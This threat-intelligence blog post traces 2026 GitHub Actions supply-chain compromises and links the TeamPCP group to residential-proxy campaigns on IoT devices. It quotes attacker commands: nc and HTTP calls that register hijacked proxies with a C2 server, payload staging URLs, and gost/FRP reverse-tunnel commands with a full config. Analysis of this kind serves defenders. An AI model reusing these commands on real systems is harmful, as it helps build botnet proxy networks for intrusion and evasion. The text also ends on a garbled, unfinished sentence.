# Overview

March was intense for cybersecurity teams across the globe. The industry observed 3 AppSec (application security) companies compromised in supply-chain attack using the same vector. 

Each of these attacks leveraged **Github Actions** in order to inject malicious code into CI/CD pipelines, often to exfiltrate further CI/CD secrets, ultimately facilitating further attacks.
 
* March 3rd 2026 -> **Xygeni's** `xygeni/xygeni-action`
* March 19th 2026 -> **Aqua Security's** `aquasecurity/trivy-action` & `aquasecurity/setup-trivy`
* March 23rd 2026 ->  **Checkmarkx's** `checkmarx/ast-github-action` & `checkmarx/kics-github-action`

The latter two were most signficant and publicly reported on. These were attributed with the cybercrime group *TeamPCP* (also known as *PCPcat*, *ShellForce*, *DeadCatx3*) - which originally started operating in Novemeber/December 2025. 

Whilst investigating TeamPCP, looking historically at their infrastructure, we did identify novel findings regarding tooling, infrastructure, and their **operational security failures** in 2025 - these will be highlighted later in this blog.

**Xygeni has not been linked to TeamPCP**, although we discovered connections that had previously gone unreported. We are not making an attribution, but we're highlighting our findings. 

# The Odd Discovery

Ctrl-Alt-Intel was not investigating TeamPCP or supply-chain attacks - but rather investigating residential proxies, edge-device exploitation, and SOCKS when we discovered a very interesting finding:

> A threat actor we were tracking in relation to March **TP-Link / ASUS** IoT exploitation **was likely** behind the March **Xygeni** supply-chain attack. 

**Firstly, how did we get here?**

> In December 2025, Ctrl-Alt-Intel identifed an unknown threat actor leverage the [open-source tooling microsocks](https://ctrlaltintel.com/research/FortiWeb-Sliver/#microsocks) - deployed to Web Application Firewalls. We have been hunting for abuse of *microsocks* tooling ever since. 

On the 5th April, we observed *microsocks* deployed to TP-Link devices, enrolling them into a residential proxy network - also leveraging a custom backdoor and beaconing protocol that was named **ShadowLink**.

## Residential Proxy Setup

Complete residential proxy setup was only observed with 1 script - `tplink_stager.sh`. The residential proxy enrollment worked as follows:

1. TA achieves RCE on TP-Link device and downloads & executes `tplink_stager.sh`

2. Relevant *microsocks* binary would be downloaded to `/tmp/.m` 

3. Residential public IP retrieved via `ipinfo.io / ifconfig.me` (e.g. `86.x.x.x`)

4. Using `exec`, `/tmp/.m` would masquearade as `[kworker/0:1]` and SOCKS5 server would start on a random port (e.g. `52847`)

5. This port number would be sent to the C2 either via `nc` or `HTTP GET`:

```bash
echo "PROXY 52847" | nc C2 7777
GET http://C2:8889/reg?ip=86.x.x.x&port=52847 
```

On the attackers-side, they'd now be aware of the residential IP + SOCKS5 port to connect to. 

Threat Actor -> SOCKS5 -> `86.x.x.x:52847` -> Victim

> The TAs could use these SOCKS5 proxy networks to obfuscate their source IP address for evasion purposes.

## 2025 Proxy Construction Campaign

On December 19th, Rubrik Zero Labs released a blog detailing the first reported TeamPCP campaign, named [PCPcat Campaign: Large-Scale Exploitation of React2Shell CVE and Cloud Infrastructure](https://zerolabs.rubrik.com/blog/pcpcat-campaign-large-scale-exploitation-react2shell-cve-and-cloud-infrastructure):

> "The PCPcat threat actors have weaponized this vulnerability alongside traditional cloud infrastructure misconfigurations to build a large-scale botnet operation focused on cryptocurrency mining, credential theft, and **proxy network construction**."

Similar tradecraft was corroborated by Flare on their [Threat Alert: TeamPCP, An Emerging Force in the Cloud Native and Ransomware Landscape](https://flare.io/learn/resources/blog/teampcp-cloud-native-ransomware) analysis:

> The operation’s goals were to build a **distributed proxy** and scanning infrastructure at scale, then compromise servers to exfiltrate data, deploy ransomware, conduct extortion, and mine cryptocurrency.

It was reported that TeamPCP/PCPcat leveraged React2Shell, alongside targeting of exposed Docker APIs, Kubernetes clusters & Ray AI dashboards to execute the paylaod `proxy.sh`, which was very interesting. 

This bash script was staged on the below 2 URIs via HTTP, using a unique port `666`:

```bash
hXXp://67.217.57[.240:666/files/proxy.sh
hXXp://44.252.85[.168:666/files/proxy.sh
```

The core `proxy.sh` scripts each downloaded additional payloads - such as `teampcp.py`, `scanner.py`, `redis-deploy.py`, `react.py`, `kube.py` & `BORING_SYSTEM` - that would allow TeamPCP to scan further exposed infrastructure, spreading payloads, and establishing further access.  

These are each downloaded from the same `/files` URI and persistence is established via the creation of services:

```bash
pcpcat-gost.service: SOCKS5 proxy 
pcpcat-frp.service: Reverse tunnel to C2 
pcpcat-scanner.service: Docker/Ray continuous scanning - scanner.py
pcpcat-react.service: CVE-2025-55182 Persistent Exploitation  - react.py
pcpcat-redis.service: Redis exploit module - redis-deploy.py
pcpcat-boring.service: Sliver 
```

Rather than leveraging *microsocks*, TeamPCP used a combination of *FRP* (Fast Reverse Proxy) and *gost* for SOCKS tunneling:

```bash
./gost -L socks5://:1080 &
sleep 2
./frpc -c ./frpc.toml &
``` 

From the above we can see a SOCKS5 listener is configured on port `1080`, with a FRP client used to forward this to the threat actors C2. The file `frpc.toml` is constructed in real time:

```bash
cat>frpc.toml<<EOF
serverAddr="$VPS_ADDR"
serverPort=$VPS_PORT
auth.method="token"
auth.token="PCPcat-FRP-Token-2024"
transport.tcpMux=true
[[proxies]]
name="$CLIENT_NAME"
type="tcp"
localIP="127.0.0.1"
localPort=1080
remotePort=890
loadBalancer.group="pcpcat-pool"
loadBalancer.groupKey="PCPcat-Group-Key"
EOF
```

We can see the variables refereneced within the configuration `VPS_ADDR`, `VPS_PORT` were all defined at the top of the script: 

[![1](/assets/images/iot/8.png){: .align-center .img-border}](/assets/images/iot/8.png)
<p class="figure-caption">Hardcoded variables</p>

Note this leveraged an authentication token `PCPcat-FRP-Token-2024`, associated with `pcpcat-pool` / `PCPcat-Group-Key`.

There were similarities in the `tplink_stager.sh` script and the above `proxy.sh`, such as using similar variable naming shcemes or using bash `case` statements for architecture detection:

**tplink_stager.sh** (March Campaign):

```bash
ARCH=$(uname -m 2>/dev/null || echo "unknown")
case "$ARCH" in
    armv7*|armv6*)  ARCH_TAG="arm"     ;;
    aarch64)        ARCH_TAG="aarch64" ;;
    mips*)          ARCH_TAG="mips"    ;;
    x86_64)         ARCH_TAG="x86_64"  ;;
    i?86)           ARCH_TAG="x86"     ;;
    *)              ARCH_TAG="arm"     ;;  # default to ARM for most routers
esac
log "arch detected: $ARCH -> $ARCH_TAG"
```

**proxy.sh** (December Campaign):

```bash
ARCH=$(uname -m)
case $ARCH in
x86_64)FRP_ARCH=amd64;GOST_ARCH=amd64;;
aarch64)FRP_ARCH=arm64;GOST_ARCH=arm64;;
armv7l)FRP_ARCH=arm;GOST_ARCH=armv7;;
```

However, we believe the the similarities in the `proxy.sh` and `tplink_stager.sh` likely originate from both actors leveraging AI to assist development. 

Wherether the actor responsible for the **tplink_stager.sh** remains uncertain.
